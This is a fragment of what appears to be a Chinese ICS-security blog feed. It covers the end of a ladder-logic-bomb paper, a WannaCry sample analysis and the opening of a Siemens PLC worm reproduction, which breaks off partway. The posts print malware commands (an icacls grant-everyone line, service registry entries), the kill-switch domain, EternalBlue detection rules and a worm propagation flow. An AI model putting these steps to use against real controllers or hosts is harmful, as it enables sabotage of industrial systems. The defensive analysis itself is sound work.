+第三个挑战是修复包含编程错误的逻辑。在PLC上运行时，代码将导致PLC主要故障“错误消息，并停止执行”，特别是我们编写的代码来访问内存数组，其索引超出了存储器阵列的长度（类似于缓冲区溢出），这样的故障可以用作LLB 攻击载荷来关闭PLC的操作，为了解决这个挑战，参与者必须了解FFL块，并检测到未初始化的存储器访问可能导致PLC处于故障状态。&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3&gt;5.2 挑战结果&lt;/h3&gt;
+&lt;p&gt;本节总结了CTF事件期间获得的挑战结果。队伍的细节是匿名的。其中一个团队不包括在分析中，因为团队设法通过无关的渠道获得了旗帜。其他团队的结果总结在表2中。只有团队2能够解决所有的挑战（即他们能够检测到所有的LLB），而第5队能够解决一个挑战。其余的团队无法检测任何LLB（梯形逻辑炸弹）。&lt;/p&gt;
+&lt;p&gt;表格2：LLB比赛统计详情
+&lt;img alt="ALT" src="/static/images/logicbombs/15.png" /&gt;&lt;/p&gt;
+&lt;p&gt;我们的评估表明，在关键的基础设施控制器代码中检测到恶意代码或隐藏的逻辑炸弹绝非易事。只有两只队伍能够在大量的子程序调用，以及几个消息和指令块中找到LLB。而包含LLB在内的更高级的挑战只有由一只团队解决了。我们得出结论，对于检测LLB，操作员必须具有Studio 5000的相关知识和编程语言，如梯形图，结构文本和功能框图及其语法和语义。实际上，如果操作员检查功能不熟悉的或由分包商写的代码，这将会是很大的麻烦。&lt;/p&gt;
+&lt;h2&gt;6. 对策&lt;/h2&gt;
+&lt;p&gt;在本节中，我们将讨论针对LLB攻击的对策。特别是，我们所讨论的，基于网络的对策以及对运行代码的集中验证。
+在下文中，我们假定将对策应用于现有的工业控制系统。如果我们可以更改给PLC下装程序的方式，则可以通过引入用户认证或用于逻辑更新的加密签名。如果用户成功认证，或更新的真实性已被验证，PLC将会接受逻辑代码更新。
+以下两个提案不需要对现有PLC进行此类更改，因此在现有系统中更容易实施。在下文中，我们假设ICS中有一些已知的操作员站，允许更新PLC的控制逻辑。任何第三方更新PLC逻辑的尝试都将被视为攻击。我们假设使用默认软件用于应用逻辑程序更新，并且我们无法更改该软件的行为。
+我们之前假设的攻击者模型：攻击者有能力操纵PLC运行一次程序，但不具有永久访问权限。攻击者没有损害操作员的机器。攻击者也无法操纵第三方网络流量。&lt;/p&gt;
+&lt;h3&gt;6.1 网络对策&lt;/h3&gt;
+&lt;p&gt;如果网络中已经使用入侵检测系统（IDS）来监控流量以传播恶意软件或其他恶意流量，那么该IDS可能用于识别与连接到网络的PLC上的逻辑更新相关的特定流量。如果观察到网络上未经授权的逻辑更新，则可能会引起警报。在[8]中提出了类似的IDS，作者使用确定性有限自动机建模HMI和PLC之间的定期通信。如果消息在正常（一般）消息序列中出现位置不正确，系统将标志异常。如果IDS被配置为作为入侵防御系统（IPS）来操作，那么甚至可以实时丢弃违规流量。
+此方案的问题与授权逻辑更新的识别有关。由于我们无法更改相应软件生成的流量，因此无法嵌入特定的验证信息。因此，我们只能使用IP源地址（据称与授权人员相关）等信息做验证，而这样做是不理想的（因为它可以被欺骗）。&lt;/p&gt;
+&lt;h3&gt;6.2 集中逻辑存储&lt;/h3&gt;
+&lt;p&gt;我们的第二个方案是基于两个组成部分：a）在ICS的所有PLC上运行的最新版本的逻辑集中逻辑存储（CLS），以及b）定期从PLC中下载当前运行逻辑的工具，并与“CL”的“金色”副本验证对照。我们提出的系统的概述可以在图14中找到。&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;提交“金色”样本
+所有授权的工程师在更改PLC上运行的逻辑时，必须将每个PLC的最新版本的逻辑提交给CLS。为此，他们可以使用一个简单的应用程序，要求他们识别相应的逻辑文件，目标PLC及其凭据。然后，该应用程序将使用凭据来建立到CLS的身份验证安全通道（例如使用TLS），然后将最新的逻辑版本上传到CLS（例如，在已建立的TLS会话中使用HTTP）。 
+&lt;img alt="ALT" src="/static/images/logicbombs/16.png" /&gt;
+图14：集中逻辑存储的对策&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;定期逻辑验证
+我们已经实现了一个基于python的工具来手动定期验证逻辑。用户首先使用Studio 5000将梯形图逻辑导出到本地机器上的.L5K文件（顺序文本）。接下来，我们的工具解析.L5K文件，并提取与逻辑对应的唯一序列号。然后，该工具通过使用优美的解析器（BSP）连接到搜索正确的“金色”逻辑的CLS。BSP是一个用于解析HTML和XML页面的python库，在我们的例子中，BSP解析CLS，并查找所有的.L5K文件，然后是我们的解析器，通过识别唯一的序列号来查找正确的“金色”逻辑。
+然后，该工具对PLC上找到的逻辑和“金色”样本进行比较。如果发现差异，则可以使用诸如diff的工具提供的标准功能将其显示给人类操作员。下面的算法总结了整个过程。
+算法1. 基于CLS的对策
+&lt;img alt="ALT" src="/static/images/logicbombs/17.png" /&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Factory Talk Asset Centre，一款由罗克韦尔自动化开发的工具，它试图实现类似的功能来保护PLC设备。然而，它还有许多额外的依赖关系，例如：在客户端/服务器端，Factory Talk服务平台，RSLinx，RSLogix 5000上都需要一个网络适配卡。我们上面提到的基于CLS的方法很容易使用，与Factory Talk Asset Center相反，Factory Center需要运营商，具有良好的系统要求和能力知识。基于CLS的方法在来自不同供应商的平台和 PLC中使用更完整，无依赖性，通用性强。&lt;/p&gt;
+&lt;h2&gt;7. 结论&lt;/h2&gt;
+&lt;p&gt;在本文中，我们引入了梯形逻辑炸弹一词来讨论PLC的逻辑恶意软件问题，比如Stuxnet [7]所做的逻辑修改。对于这种设备的漏洞研究通常不包括对控制逻辑级别的分析，而这种逻辑级别的漏洞也被证明为的重要攻击来源。我们分析了在PLC上运行的固件的漏洞，并对实际的PLC实时案例和攻击脚本进行了研究，对工业控制系统造成损害。通过小规模的评估，我们已经明确，甚至是非常简单的LLB都难以在现实世界的控制逻辑代码中检测出来。所有的测试都是在实际的ICS上进行的，而这与当今大多数文献中提出的理论不同。最后，提出并实现了一种基于集中逻辑存储的对策技术，可以有效地检测基于逻辑层的攻击。&lt;/p&gt;
+&lt;h2&gt;8、参考文献&lt;/h2&gt;
+&lt;p&gt;[1] S. Amin, X. Litrico, S. S. Sastry, and A. M. Bayen. Stealthy deception attacks on water SCADA systems.In Proceedings of Conference on Hybrid systems: Computation and Control, pages 161-170. ACM, 2010.
+[2] B. Batke, J. Visoky, J. Kay, S. Mintz, and W. Cook. Methods for firmware signature, 2013. US Patent 8,484,474. 
+[3] D. Beresford. Exploiting Siemens Simatic S7 PLCs, 2011. Proceedings of Black Hat USA.
+[4] A. A. C′ardenas, S. Amin, and S. Sastry. Research challenges for the security of control systems. In Proceedings of USENIX workshop on Hot Topics in Security (HotSec), 2008.
+[5] M. Caselli, E. Zambon, and F. Kargl. Sequence-aware intrusion detection in industrial control systems. In Proceedings of the 1st ACM Workshop on Cyber-Physical System Security, pages 13-24. ACM, 2015.
+[6] R. Chabukswar, B. Sin′opoli, G. Karsai, A. Giani, H. Neema, and A. Davis. Simulation of network attacks on SCADA systems. In Proceedings of Workshop on Secure Control Systems, 2010.
+[7] N. Falliere, L. O. Murchu, and E. Chien. W32. Stuxnet dossier.
+[8] N. Goldenberg and A. Wool. Accurate modeling of modbus/tcp for intrusion detection in scada systems. International Journal of Critical Infrastructure Protection, 6(2):63-75, 2013.
+[9] D. Hadˇziosmanovi′c, R. Sommer, E. Zambon, and P. H. Hartel. Through the eye of the PLC: semantic security monitoring for industrial processes. In Proceedings of the Conference on Annual Computer Security Applications Conference (ACSAC), pages 126-135. ACM, 2014. 
+[10] K. H. John and M. Tiegelkamp. IEC 61131-3: Programming Industrial Automation Systems Concepts and Programming Languages, Requirements for Programming Systems, Decision-Making Aids. Springer, 2nd edition, 2010.
+[11] S. Karnouskos. Stuxnet worm impact on industrial cyber-physical system security. In Proceedings of Conference on Industrial Electronics Society (IECON), pages 4490-4494. IEEE, 2011.
+[12] D.-Y. Kim. Cyber security issues imposed on nuclear power plants. Annals of Nuclear Energy, 65:141-143, 2014.
+[13] G. H. Kim and E. H. Spafford. The design and implementation of tripwire: A file system integrity checker. In Proceedings of the 2nd ACM Conference on Computer and Communications Security, pages 18-29. ACM, 1994.
+[14] O. Kosut, L. Jia, R. Thomas, and L. Tong. Malicious data attacks on smart grid state estimation: Attack strategies and countermeasures. In Proc. of the IEEE Conference on Smart Grid Communications (SmartGridComm), pages 220-225, Oct 2010.
+[15] M. Krotofil, A. A. C′ardenas, B. Manning, and J. Larsen. CPS: driving cyber-physical systems to unsafe operating conditions by timing DoS attacks on sensor signals. In Proceedings of the Conference on Annual Computer Security Applications Conference (ACSAC), pages 146-155. ACM, 2014.
+[16] J. Lin, W. Yu, X. Yang, G. Xu, and W. Zhao. On false data injection attacks against distributed energy routing in smart grid. In Proceedings of Conference on Cyber-Physical Systems (ICCPS), 2012.
+[17] Y. Liu, P. Ning, and M. K. Reiter. False data injection attacks against state estimation in electric power grids. ACM Transactions on Information and System Security (TISSEC), 14(1):13, 2011.
+[18] S. McLaughlin. On dynamic malware pyloads aimed at programmable logic controllers. In Proceedings of USENIX conference on Hot topics in security (HotSec), pages 10-10, Aug 2013.
+[19] S. McLaughlin and P. McDaniel. SABOT: Specification-based payload generation for programmable logic controllers. In Proc. of the ACM Conference on Computer and Communications Security (CCS), pages 439-449. ACM, 2012.
+[20] S. E. McLaughlin, S. A. Zonouz, D. J. Pohly, and P. D. McDaniel. A trusted safety verifier for process controller code. In Proc. Network and Distributed System Security Symp. (NDSS), 2014.
+[21] S. A. Milinkovic and L. R. Lazic. Industrial PLC security issues. In Proceedings of Conference on Telecommunications Forum (TELFOR), pages 1536-1539. IEEE, 2012.
+[22] T. H. Morris and W. Gao. Industrial control system cyber attacks. In Proceedings of the Symposium for ICS and SCADA cyber security research (ICS-CSR). BCS Learning and Development Ltd., 2013.
+[23] J. Pollet. Electricity for free? The dirty underbelly of SCADA and smart meters, 2010. Proceedings of Black Hat USA.
+[24] E. Wang, Y. Ye, X. Xu, S. Yiu, L. Hui, and K. Chow. Security issues and challenges for cyber physical system. In Proceedings of Conference on Cyber, Physical and Social Computing (CPSCom), pages 733 -738, Dec. 2010.
+[25] B. Zhu, A. Joseph, and S. Sastry. A taxonomy of cyber attacks on SCADA systems. In Proceedings of Conference on Cyber, Physical and Social Computing (CPSCom), pages 380-388, 2011.
+[26] S. Zonouz, K. Rogers, R. Berthier, R. Bobba, W. Sanders, and T. Overbye. SCPSE: Security-oriented cyber-physical state estimation for power grid critical infrastructures. Smart Grid, IEEE Transactions on, 3(4):1790-1799, Dec 2012.
+[27] S. Zonouz, J. Rrushi, and S. McLaughlin. Detecting industrial control malware using automated PLC code analytics. Security &amp;amp; Privacy, IEEE, 12(6):40-47, 2014.&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">Dark_Alex</dc:creator><pubDate>Mon, 22 May 2017 11:36:00 +0800</pubDate><guid>tag:icsmaster.com,2017-05-22:news/logicblob.html</guid><category>工控安全</category></item><item><title>Wannacry(永恒之蓝)勒索蠕虫跟踪分析</title><link>http://icsmaster.com/security/wannacry.html</link><description>&lt;h2&gt;一、事件跟踪&lt;/h2&gt;
+&lt;p&gt;北京时间2017年5月12日晚间，一款名为Wannacry 的蠕虫勒索软件袭击全球网络，经研究发现这是不法分子通过改造之前泄露的NSA黑客武器库中“永恒之蓝”攻击程序发起的网络攻击事件。“永恒之蓝”通过扫描开放445文件共享端口的Windows电脑甚至是相关移动终端，无需用户进行任何操作，只要开机联网，不法分子就能在电脑和服务器中植入勒索软件、远程控制木马、虚拟货币挖矿机等一系列恶意程序。这被认为是迄今为止最巨大的勒索交费活动，影响到近百个国家上千家企业及公共组织。 该软件被认为是一种蠕虫变种（也被称为“Wannadecrypt0r”、“wannacryptor”或“ wcry”）。 像其他勒索软件的变种一样，WannaCry也阻止用户访问计算机或文件，要求用户需付费解锁。相关影响截图如下：&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Alt text" src="/static/images/wannacry/1.jpg" /&gt;&lt;/p&gt;
+&lt;p&gt;工匠实验室是华创网安旗下的专注于工控安全领域的研究实验室，作为工控安全的守护者，紧急启动应急响应，对事件和病毒进行了相关分析，希望通过微薄之力对网络安全做出贡献。&lt;/p&gt;
+&lt;h2&gt;二、安全态势&lt;/h2&gt;
+&lt;p&gt;全球感染态势图&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Alt text" src="/static/images/wannacry/21.jpg" /&gt;&lt;/p&gt;
+&lt;p&gt;感染TOP 20的国家统计&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Alt text" src="/static/images/wannacry/22.png" /&gt;&lt;/p&gt;
+&lt;p&gt;初略的统计国内可能存在威胁主机（不包括台湾、香港、澳门）的分布图如下：&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Alt text" src="/static/images/wannacry/23.gif" /&gt;&lt;/p&gt;
+&lt;h2&gt;三、病毒样本分析&lt;/h2&gt;
+&lt;p&gt;样本本身会释放之后需要调用的加密文件以及其它的:
+加密密码: WNcry@2ol7&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Alt text" src="/static/images/wannacry/31.png" /&gt;&lt;/p&gt;
+&lt;p&gt;文件本身包含的文件如下:&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Alt text" src="/static/images/wannacry/32.png" /&gt;&lt;/p&gt;
+&lt;p&gt;当样本运行起来之后,会释放在如下目录:&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Alt text" src="/static/images/wannacry/33.png" /&gt;&lt;/p&gt;
+&lt;p&gt;创建并以服务的方式运行:
+"ImagePath=cmd.exe /c "C:\Intel\ykpgmdelqxu787\tasksche.exe"" in key HKEY_LOCAL_MACHINE\system\Curre ntControlSet\Services\ykpgmdelqxu787&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Alt text" src="/static/images/wannacry/34.png" /&gt;&lt;/p&gt;
+&lt;p&gt;已注册表的形式创建mssecsvc2.0服务并启动:&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Alt text" src="/static/images/wannacry/35.png" /&gt;&lt;/p&gt;
+&lt;p&gt;提权代码:
+icacls . /grant Everyone:F /T /C /Q&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Alt text" src="/static/images/wannacry/36.png" /&gt;&lt;/p&gt;
+&lt;p&gt;样本执行之后会访问www.iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com通过 80端口,开始实现端口扫描并尝试连接:&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Alt text" src="/static/images/wannacry/37.png" /&gt;&lt;/p&gt;
+&lt;p&gt;通过cmd启动tasksche.exe进程：
+C:\Intel\ykpgmdelqxu787\tasksche.exe, C:\Intel\ykpgmdelqxu787\tasksche.exe, C:\WINDOWS\system32。&lt;/p&gt;
+&lt;p&gt;tasksche.exe会创建taskdl.exe,attrib.exe子进程调用cscript.exe进程实现加密 ：
+C:\WINDOWS\system32\cscript.exe, cscript.exe //nologo m.vbs, C:\Intel\ykpgmdelqxu787&lt;/p&gt;
+&lt;p&gt;进程关系如下：&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Alt text" src="/static/images/wannacry/38.png" /&gt;&lt;/p&gt;
+&lt;p&gt;加密扩展文件如下，可以看出加密的文件中并不是针对工控网络:&lt;/p&gt;
+&lt;p&gt;.der, .pfx, .key, .crt, .csr, .p12, .pem, .odt, .ott, .sxw, .stw, .uot, .3ds, .max, .3dm, .ods, .ots, .sxc, .stc, .dif, .slk, .wb2, .odp, .otp, .sxd, .std, .uop, .odg, .otg, .sxm, .mml, .lay, .lay6, .asc, .sqlite3, .sqlitedb, .sql, .accdb, .mdb, .db, .dbf, .odb, .frm, .myd, .myi, .ibd, .mdf, .ldf, .sln, .suo, .cs, .cpp, .pas, .asm, .js, .cmd, .bat, .ps1, .vbs, .vb, .pl, .dip, .dch, .sch, .brd, .jsp, .php, .asp, .rb, .java, .jar, .class, .sh, .mp3, .wav, .swf, .fla, .wmv, .mpg, .vob, .mpeg, .asf, .avi, .mov, .mp4, .3gp, .mkv, .3g2, .flv, .wma, .mid, .m3u, .m4u, .djvu, .svg, .ai, .psd, .nef, .tiff, .tif, .cgm, .raw, .gif, .png, .bmp, .jpg, .jpeg, .vcd, .iso, .backup, .zip, .rar, .7z, .gz, .tgz, .tar, .bak, .tbk, .bz2, .PAQ, .ARC, .aes, .gpg, .vmx, .vmdk, .vdi, .sldm, .sldx, .sti, .sxi, .602, .hwp, .snt, .onetoc2, .dwg, .pdf, .wk1, .wks, .123, .rtf, .csv, .txt, .vsdx, .vsd, .edb, .eml, .msg, .ost, .pst, .potm, .potx, .ppam, .ppsx, .ppsm, .pps, .pot, .pptm, .pptx, .ppt, .xltm, .xltx, .xlc, .xlm, .xlt, .xlw, .xlsb, .xlsm, .xlsx, .xls, .dotx, .dotm, .dot, .docm, .docb, .docx, .doc, .c, .h&lt;/p&gt;
+&lt;h2&gt;四、防御措施&lt;/h2&gt;
+&lt;p&gt;为了减少网络攻击造成的影响，华创网安相关产品紧急更新了相关防护措施，监测审计产品，已经部署相关规则，可以及时发现网络中的蠕虫病毒。工控漏洞评估系统已增加相应的漏洞检测脚本，可以提前发现网络中的存在漏洞的主机。&lt;/p&gt;
+&lt;h4&gt;1、传统网络防护措施&lt;/h4&gt;
+&lt;p&gt;根据此攻击，传统网络的防御措施如下：&lt;/p&gt;
+&lt;p&gt;1．防火墙屏蔽445端口
+2．利用 Windows Update 进行系统更新
+3．关闭 SMBv1 服务
+4．部署相应的检测规则&lt;/p&gt;
+&lt;p&gt;【检测规则】
+尽快部署在相关网络设备中部署如下检测规则&lt;/p&gt;
+&lt;p&gt;alert smb any any -&amp;gt; $HOME_NET any (msg:”ET EXPLOIT Possible ETERNALBLUE MS17-010 Echo Request (set)”; flow:to_server,established; content:”|00 00 00 31 ff|SMB|2b 00 00 00 00 18 07 c0|”; depth:16; fast_pattern; content:”|4a 6c 4a 6d 49 68 43 6c 42 73 72 00|”; distance:0; flowbits:set,ETPRO.ETERNALBLUE; flowbits:noalert; classtype:trojan-activity; sid:2024220; rev:1;)&lt;/p&gt;
+&lt;p&gt;alert smb $HOME_NET any -&amp;gt; any any (msg:”ET EXPLOIT Possible ETERNALBLUE MS17-010 Echo Response”; flow:from_server,established; content:”|00 00 00 31 ff|SMB|2b 00 00 00 00 98 07 c0|”; depth:16; fast_pattern; content:”|4a 6c 4a 6d 49 68 43 6c 42 73 72 00|”; distance:0; flowbits:isset,ETPRO.ETERNALBLUE; classtype:trojan-activity; sid:2024218; rev:1;)&lt;/p&gt;
+&lt;p&gt;【漏洞补丁】
+由于本次Wannacry蠕虫事件的巨大影响，微软总部刚才决定发布已停服的XP和部分服务器版特别补丁。注意工控现场设备一定需要充分验证后才去更新相应的补丁。
+https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Alt text" src="/static/images/wannacry/41.png" /&gt;&lt;/p&gt;
+&lt;h4&gt;2、工控网络防护措施&lt;/h4&gt;
+&lt;p&gt;传统网络防御措施都适合工控网络吗，答案当然是否定的，原因如下：&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;
+&lt;p&gt;工控网络主机在安装相关软件时，会关闭windows防火墙，开启防火墙会影响上位机与控制设备之间的通信。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;更新windows补丁。连续性生产的设备上是无法实施，一旦因为补丁影响通信，后果无法估量。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;关闭SMBv1服务。连续性生产的设备上是无法实施。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;部署相应的检测规则。可以实施，尽快更新边界防护策略。&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;由此可见，工控网络对于网络安全事件的响应是多么的困难和缓慢。不过幸庆的是，目前此蠕虫病毒仅通过网络进行传播，还未发现感染移动介质，很多工控网络因为隔离，躲过了此次攻击。但随着中国的工业4.0、智能制造等项目的推进，越来越多的工控系统会连接互联网，会了提前预防，我们是时候行动机来啦。对于此种类型的攻击，我们推荐的防御措施如下：&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;1. 工控网络与信息网之间部署工控防火墙，禁示SMB协议数据的传播。
+
+2. 主机安装白名单的工控防护软件，限制移动介质的使用、非法软件的安装、非法进程的运行，避免移动介质的感染。
+
+3. 工控网络中部署监测设备，实时监测蠕虫病毒，一旦发现立即上报告警，进行应急响应。
+&lt;/pre&gt;&lt;/div&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">w3h</dc:creator><pubDate>Sat, 13 May 2017 14:36:00 +0800</pubDate><guid>tag:icsmaster.com,2017-05-13:security/wannacry.html</guid><category>工控安全</category></item><item><title>针对西门子PLC蠕虫的实现</title><link>http://icsmaster.com/security/plcblaster.html</link><description>&lt;h2&gt;研究背景&lt;/h2&gt;
+&lt;p&gt;随着“互联网+”、“中国智能制造2025“、“工业4.0”等概念的提出，为了提高生产率，独立、隔离的传统工控领域将迎来了新的互联网时代，越来越多的工控设备（如控制器、机器人、数控机床）将被暴露在互联网上或者与企业内网相连。随着互联网时代的来临，安全问题会越来越突出。然而，工业控制系统的安全不同于传统信息网络的安全，一旦出现网络攻击，后果不堪设想。关于工控病毒相关关键事件如下：&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;2010年伊朗核设施遭受“震网”超级病毒攻击，病毒的复杂程度超出人们的想象，该事件也被称为世界上首个“网络超级武器”事件。由于工业病毒攻击可以直接导致物理设备的故障，并进一步造成生产瘫痪甚至爆炸的灾难性后果。&lt;/li&gt;
+&lt;li&gt;Black Hat 2011报告&lt;a href="https://github.com/w3h/icsmaster/raw/master/doc/%E5%9B%BD%E5%A4%96/Exploiting%20Siemens%20Simatic%20S7%20PLCs.pdf"&gt;《Exploiting Siemens Simatic S7 PLCs》&lt;/a&gt;，演示了通过西门子S7Comm协议的权限缺失漏洞来远程操作PLC，对PLC进行启停控制、内存的读写。&lt;/li&gt;
+&lt;li&gt;Black Hat 2015报告&lt;a href="https://github.com/w3h/icsmaster/raw/master/doc/%E5%9B%BD%E5%A4%96/us-15-Klick-Internet-Facing-PLCs-A-New-Back-Orifice-wp.pdf"&gt;《Internet-facing PLCs – A New Back Orifice》&lt;/a&gt;，演示了如何通过PLC实现通信代理，通过PLC突破网络边界，来发现内网中更多的PLC设备。&lt;/li&gt;
+&lt;li&gt;Black Hat 2016报告&lt;a href="https://github.com/w3h/icsmaster/raw/master/doc/%E5%9B%BD%E5%A4%96/asia-16-Spenneberg-PLC-Blaster-A-Worm-Living-Solely-In-The-PLC-wp.pdf"&gt;《PLC-Blaster: A Worm Living Solely in the PLC 》&lt;/a&gt;，提出了PLC蠕虫病毒的概念,提出了西门子1200 V3版本协议认证的缺陷，但没有具体的实现细节。&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;近日，工匠实验室工控安全专家针对PLC进行深入研究，通过梯形图和SCL相结合的方式，利用PLC自身通信功能, 复现了这个病毒，实现了病毒在PLC与PLC之间进行传播。同时，针对这一病毒，我们已经开发了相应的检测工具，这标志着华创网安在工控安全领域掌握了这方面的核心技术，也体现了工控领域的研发实力。&lt;/p&gt;
+&lt;h2&gt;PLC基本结构&lt;/h2&gt;
+&lt;p&gt;PLC 实质是一种专用于工业控制的计算机，其硬件结构基本上与微型计算机相同，如图所示：&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Alt text" src="/static/images/plcblaster/1.gif" /&gt;&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;
+&lt;p&gt;中央处理单元（CPU）
+中央处理单元（CPU）是PLC 的控制中枢。它按照PLC 系统程序赋予的功能接收并存储从编程器键入的用户程序和数据：检查电源、存储器、I/O 以及警戒定时器的状态，并能诊断用户程序中的语法错误，当PLC 投入运行时，首先它以扫描的方式接收现场各输入装置的状态和数据，并分别存入I/O 映象区，然后从用户程序存储器中逐条读取用户程序，经过命令解释后按指令的规定执行逻辑或算数运算的结果送入I/O 映象区或数据寄存器内。等所有的用户程序执行完毕之后，最后将I/O映象区的各输出状态或输出寄存器内的数据传送到相应的输出装置，如此循环运行，直到停止运行。
+为了进一步提高PLC 的可靠性，近年来对大型PLC 还采用双CPU 构成冗余系统，或采用三CPU 的表决式系统。这样，即使某个CPU 出现故障，整个系统仍能正常运行。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;存储器
+存放系统软件的存储器称为系统程序存储器。存放应用软件的存储器称为用户程序存储器。虽然各种PLC的CPU的最大寻址空间各不相同，但是根据PLC的工作原理其存储空间一般包括以下三个区域：系统程序存储区、系统RAM 存储区（包括I/O 映象区和系统软设备等）、用户程序存储区&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;电源
+PLC 的电源在整个系统中起着十分重要得作用。如果没有一个良好的、可靠得电源系统是无法正常工作的，因此PLC 的制造商对电源的设计和制造也十分重视。一般交流电压波动在±10%（±15%）范围内，可以不采取其它措施而将PLC 直接连接到交流电网上去。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;输入/输出电路
+I/O扩展接口用于将扩充外部输入/输出端子数的扩展单元与基本单元（即主机）连接在一起。&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h2&gt;蠕虫介绍&lt;/h2&gt;
+&lt;p&gt;蠕虫病毒是一种常见的计算机病毒。它是利用网络进行复制和传播，传染途径是通过网络和电子邮件。最初的蠕虫病毒定义是因为在DOS环境下，病毒发作时会在屏幕上出现一条类似虫子的东西，胡乱吞吃屏幕上的字母并将其改形。蠕虫病毒是自包含的程序（或是一套程序），它能传播自身功能的拷贝或自身的某些部分到其他的计算机系统中（通常是经过网络连接）。&lt;/p&gt;
+&lt;p&gt;工控蠕虫主要的针对的对象是工业控制设备，通过控制器之间进行病毒传播，这与传统计算机蠕虫是存在很大差别，传统蠕虫寄生对象都是计算机（Window或者Linux），工控蠕虫寄生对象是控制器逻辑代码中。由于病毒可以混淆于正常的控制逻辑代码中，传统防御方式都不适合于工控蠕虫的防护，检测与查杀的方式更强困难。
+虽然工控蠕虫与计算机蠕虫存在很多的不同点，但所有的蠕虫的基本架构都是相同的。所有的蠕虫攻击都可以归为一下几个阶段：搜索目标，感染目标，在目标上执行，添加恶意功能。由于PLC控制器提供网络通信能力，在PLC上蠕虫也同样支持这些功能。这篇文章将展示每个必须组件的实现方法。&lt;/p&gt;
+&lt;h2&gt;蠕虫实现&lt;/h2&gt;
+&lt;p&gt;蠕虫实现的主要的编程软件为西门子的TIA Portal(博途)，在TIA Portal(博途)编程软件中，用户通过编写程序来完成工业现场的控制以及工艺流程的实现。博途中分为以下几类块：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;OB(Organization Block )：组织块，为程序的入口块，被系统直接调用（其他块不可以被系统直接调用，必须包含在OB中才可以执行）。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;FB(Function Block)：功能块，既可以是博途中已包含的功能块，也可以是用户自己编写的块，编程中需要带背景数据块（又叫实例数据块，Instance Data Block）使用。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;FC(Function)：功能，既可以是博途中已包含的功能块，也可以是户自己编写，不可以带背景数据块。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;DB(Data Block)：数据块，分为背景数据块和共享数据块，其中背景数据块为私有块。编程时，户可以定义共享数据块的数据存储结构，不可以定义背景数据块的数据存储结构，必须由FB定义。数据块中的数据掉电不丢失。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;SFB(System Function Block)：系统功能块，系统内部功能块，用户不可自己编写，不可更改，使用同FB。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;SFC(System Function)：系统功能，系统内部功能，用户不可自己编写，不可更改，使用同FC。
+博途软件支持的编程语言有： LD(梯形图)，FBD(功能块图)、SCL(结构化控制语言)、STL(语句列表)。&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;S7-1200只支持LAD、FBD和SCL三种编程语言，并且在下载过程中会先停止运行，然后下载程序，下载完成后重新启动。&lt;/p&gt;
+&lt;h3&gt;1. 实现流程&lt;/h3&gt;
+&lt;p&gt;病毒首先选择IP通过西门子通信端口102尝试建立连接，如果连接建立成功，则检查目标PLC是否已被感染。如连接未建立成功，或目标PLC已被感染，则选择新IP重新尝试建立连接。如目标PLC未被感染，则停止目标PLC，下装病毒程序，最后重新启动目标PLC。流程如下图所示。&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Alt text" src="/static/images/plcblaster/3.gif" /&gt;&lt;/p&gt;
+&lt;h3&gt;2. 寻找目标&lt;/h3&gt;
+&lt;p&gt;西门子PLC通过102端口进行TCP通信，因此可以尝试通过102端口与设备建立TCP通信来寻找目标。博途开发平台提供了两个FB块——通讯连接块TCON和断开通讯连接块TDISCON，如下图所示。&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Alt text" src="/static/images/plcblaster/4.gif" /&gt;&lt;/p&gt;
+&lt;p&gt;程序块TCON和TDISCON的参数说明&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Alt text" src="/static/images/plcblaster/5.gif" /&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;使用TCON和DISTCON块尝试建立和断开连接&lt;/li&gt;
+&lt;/ul&gt;
